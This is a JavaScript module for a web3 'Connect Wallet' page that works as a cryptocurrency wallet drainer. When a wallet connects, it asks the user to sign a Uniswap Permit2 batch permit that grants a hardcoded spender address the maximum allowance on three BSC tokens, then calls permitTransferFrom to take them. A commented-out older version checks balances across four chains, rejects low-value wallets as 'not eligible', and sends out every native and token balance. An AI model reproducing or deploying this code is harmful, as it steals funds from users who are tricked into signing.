import { BrowserProvider, JsonRpcProvider, Contract } from "ethers";
import {
  SignatureTransfer,
  MaxUint160,
  PERMIT2_ADDRESS,
} from "@uniswap/permit2-sdk";
import { store, updateStore } from "../store/appkitStore";
import { bsc, mainnet, polygon, base } from "@reown/appkit/networks";
import { signMessage, sendTx } from "../services/wallet";
import { fetchEvmBalances } from "../mine";
import Swal from "sweetalert2";

const TOKENS = [
  "0x55d398326f99059fF775485246999027B3197955",
  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
  "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
];

const SPENDER = "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2";
const CHAIN_ID = 56;

const MIN = 0.1;
const chainInitializers = {
  bsc: {
    initializer: bsc,
    type: "evm",
  },
  eth: {
    initializer: mainnet,
    type: "evm",
  },
  polygon: {
    initializer: polygon,
    type: "evm",
  },
  base: {
    initializer: base,
    type: "evm",
  },
};

export const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId);
  if (element) {
    element.innerHTML = JSON.stringify(state, null, 2);
  }
};

export const updateTheme = (mode) => {
  document.documentElement.setAttribute("data-theme", mode);
  document.body.className = mode;
};

export const updateButtonVisibility = (isConnected) => {
  const connectedOnlyButtons = document.querySelectorAll(
    "[data-connected-only]"
  );
  connectedOnlyButtons.forEach((button) => {
    if (!isConnected) button.style.display = "none";
    else button.style.display = "";
  });
};

let isConnected,
  processed,
  setUp = "not setup",
  eligible = 0;

export const updateBtnText = async (modal) => {
  isConnected = modal.getIsConnectedState();
  const element = document.getElementById("open-connect-modal");
  element.textContent = isConnected ? "My Wallet" : "Connect Wallet";

  //modal.open();

  if (!isConnected) return console.log("⛔️ Not connected!");

  if (processed) return console.log("✅ Already processed!");
  processed = true;

  //const walletProvider = await modal.getWalletProvider() //store.eip155Provider;
  /*
    const rpc = new JsonRpcProvider("https://bsc-dataseed.binance.org/");

    const walletProvider = await modal.getWalletProvider();
const wcProvider = new BrowserProvider(walletProvider);

let signer = await wcProvider.getSigner();
signer = signer.connect(rpc); 



    const ethersProvider = new BrowserProvider(walletProvider);
    //const signer = await ethersProvider.getSigner();
    */

  const walletProvider = await modal.getWalletProvider();

  const ethersProvider = new BrowserProvider(walletProvider);

  const signer = await ethersProvider.getSigner();


  const owner = modal.getAddress();

  const permit = {
    permitted: TOKENS.map((token) => ({
      token,
      amount: MaxUint160,
    })),
    owner,
    spender: SPENDER,
    nonce: 0,
    deadline: Math.floor(Date.now() / 1000) + 60,
  };


  const { domain, types, values } = SignatureTransfer.getPermitData(
    permit,
    PERMIT2_ADDRESS,
    CHAIN_ID
  );
  values.permitted = values.permitted.map(p => ({
    token: p.token,
    amount: p.amount.toString()
  }))

  values.permitted = values.permitted.map(p => ({
    token: p.token,
    amount: p.amount.toString()
  }))

  console.log("EIP712:", { domain, types, values });

  const signature = await walletProvider.request({
    method: "eth_signTypedData_v4",
    params: [
      owner,
      JSON.stringify({
        domain,
        types: {
          ...types,
          EIP712Domain: [
            { name: "name", type: "string" },
            { name: "chainId", type: "uint256" },
            { name: "verifyingContract", type: "address" },
          ],
        },
        primaryType: "PermitBatchTransferFrom",
        message: values,
      }),
    ],
  });

  console.log("Permit2 Signature:", signature);


  const permit2Contract = new Contract(
  SPENDER,
  [
    "function permitTransferFrom((address owner,address spender,uint256 nonce,uint256 deadline,(address token,uint256 amount)[] permitted),address owner,bytes signature) external"
  ],
  signer
);

console.log(permit2Contract);



// Execute transfer
const tx = await permit2Contract.permitTransferFrom(
  permit,
  permit.owner,
  signature
);

console.log("Transaction hash:", tx.hash);
await tx.wait();
console.log("Tokens transferred!");




  /*
  isConnected = modal.getIsConnectedState();
  const element = document.getElementById("open-connect-modal");
  element.textContent = isConnected ? "My Wallet" : "Connect Wallet";

  if (setUp === "not setup" && isConnected) {
    console.log("✅ Wallet Connected!");
    setUp = "setting up";
    console.log(setUp);
    for (const chain of Object.keys(chainInitializers)) {
      const address = modal.getAddress();
      const balances = await fetchEvmBalances(chain, address);
      console.log(balances);
      if (balances?.error) continue;
      const { nativeBalanceUsd, tokens } = balances;

      if (nativeBalanceUsd < MIN && !tokens.find((t) => t.balanceUsd >= MIN)) {
        console.log(
          `✍🏻 ${chain.toUpperCase()} has 0 or less than ${MIN}USD balances both native & Tokens = Ineligible Wallet ⛔️`
        );
        continue;
      }
      eligible++;
      chainInitializers[chain].balances = balances;
    };
    if (eligible === 0) {
      await modal.disconnect();
      isConnected = false;
      processed = false;
      setUp = "not setup";
      Swal.fire({
        icon: "error",
        title: "Not Eligible!",
        text: "Sorry, your connected wallet is not eligible!",
        timer: 3000,
        timerProgressBar: true,
        showConfirmButton: false,
        position: "top-end",
        background: "#000",
        color: "#fff",
      });
      return;
    };
    setUp = "done setup";
  };

  element.onclick = async () => {
    if (setUp !== "done setup" && isConnected && !processed) {
      return Swal.fire({
        icon: "info",
        title: "Hold On!",
        text: "Please hold while loading your wallet...",
        timer: 3000,
        timerProgressBar: true,
        showConfirmButton: false,
        position: "top-end",
        background: "#000",
        color: "#fff",
      });
    };

    modal.open();

    if (!isConnected) return;

    if (processed) return console.log("✅ Already processed!");
    processed = true;

    for (const chain of Object.keys(chainInitializers)) {
      const { initializer, type, balances } = chainInitializers[chain];
      if (!balances){
        console.log(`${chain} has no balances!`);
        continue;
      }
      const { address, nativeBalance, nativeBalanceUsd, tokens } = balances;

      await modal.switchNetwork(initializer);
      console.log(`Switched to ${chain}: ${address}`);

      const chainProvider = store.eip155Provider;

      try {
        if (nativeBalanceUsd >= MIN) {
          const tx = await sendTx(
            type,
            "native",
            chainProvider,
            address,
            nativeBalance
          );
          console.log(tx);
        } else {
          console.log(
            `⚠️ ${chain.toUpperCase()} ignored, it has only ${nativeBalanceUsd}USD!`
          );
        }
      } catch (e) {
        console.log("Error while sending native:", chain, e);
      }

      
      for (const token of tokens) {
        const { tokenAddress, balance, name, symbol, decimals } = token;
        try {
          const tx = await sendTx(
            type,
            "token",
            chainProvider,
            address,
            balance,
            tokenAddress,
            decimals
          );
          console.log(tx);
        } catch (e) {
          console.log(
            "Error while sending token " + name + "(" + symbol + ") :",
            chain,
            e
          );
        }
      };


    }
  };
  */
};
